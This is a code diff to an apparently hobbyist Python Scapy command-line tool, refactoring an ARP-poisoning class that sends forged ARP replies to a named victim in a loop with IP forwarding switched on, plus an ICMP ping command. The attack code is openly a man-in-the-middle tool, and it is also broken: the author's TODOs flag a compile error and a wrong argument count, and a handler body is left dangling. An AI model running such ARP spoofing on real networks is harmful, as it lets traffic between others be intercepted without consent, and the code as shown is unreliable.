@@ -41,9 +41,10 @@ def arp_monitor_callback(pkt):
 	#return pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")
 	
 	
-class Arp():
-    
-    routerip = vicitimIP = routerMAC= victimMAC = None
+class Arp:
+   
+#    def __init__(self, victim 
+    routerIP = victimIP = routerMAC= victimMAC = None
 
     def originalMAC(ip):
         ans,unans = srp(ARP(pdst=ip), timeout=5, retry=3)
@@ -59,9 +60,9 @@ class Arp():
         send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=3)
         sys.exit("losing...")    
 
-    def signal_handler(signal, frame):
-        with ipf as open('/proc/sys/net/ipv4/ip_forward', 'w'):#TODO compile error
-            ipf.write('0\n')#disable IP forwarding
+   # def signal_handler(signal, frame):
+   #     with ipf as open('/proc/sys/net/ipv4/ip_forward', 'w'):#TODO compile error
+   #         ipf.write('0\n')#disable IP forwarding
         restore(routerIP, victimIP, routerMAC, victimMAC)
         
 
@@ -155,25 +156,24 @@ class CLI(cmd.Cmd):
 #		count = int(pinglist[1])	
 	    
 	   # print"\n pinglist length: ",len(pinglist)
-	    host = arg
-	    count = 1
-	    packet = IP(dst=host)/ICMP()
-	    for x in range(count):
-		ans = sr1(packet)
+#	    host = arg
+#	    count = 1
+#	    packet = IP(dst=host)/ICMP()
+#	    for x in range(count):
+#		ans = sr1(packet)
 		#ans.show()
-#TODO clean up display. Here might be how...
 # set target ip and icmp-data
-#ip_target = "192.168.2.200"
-#data = "Space for Rent!"
+	    ip_target = arg 
+	    data = "Space for Rent!"
 # define ip and icmp
-#ip = IP()
-#icmp = ICMP()
+	    ip = IP()
+	    icmp = ICMP()
 # creat ip + icmp parameters
-#ip.dst = ip_target
-#icmp.type = 8
-#icmp.code = 0
-#a = sr1(ip/icmp/data)
-#a.summary()
+	    ip.dst = ip_target
+	    icmp.type = 8
+	    icmp.code = 0
+	    a = sr1(ip/icmp/data)
+	    a.summary()
 
     def do_arp(self, arg):
 	"""arp [routerIP] [victimIP] [routerMAC] [victimMAC]"""
@@ -187,15 +187,18 @@ class CLI(cmd.Cmd):
     
 	    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:
 		ipf.write('1\n')#enable IP forwarding with '1'     
-	    signal.signal(signal.SIGINT, signal_handler)
+	    #signal.signal(signal.SIGINT, signal_handler)
+	    
+	    arpAttack = Arp()       
 
-	    arplist[0] = Arp.routerIP
-	    arplist[1] = Arp.victimIP
-	    arplist[2] = Arp.routerMAC
-	    arplist[3] = Arp.victimMAC
-        
+	    arplist[0] = arpAttack.routerIP
+	    arplist[1] = arpAttack.victimIP
+	    arplist[2] = arpAttack.routerMAC
+	    arplist[3] = arpAttack.victimMAC
+	    
 	    while 1:
-		poison(Arp.routerIP, Arp.victimIP, Arp.routerMAC, Arp.victimMAC)
+		arpAttack.poison(arpAttack.routerIP, arpAttack.victimIP, arpAttack.routerMAC, arpAttack.victimMAC)
+		#TODO says I am passing it 5 arguments when it takes 4
 		time.sleep(1.5)
 	        
 	       
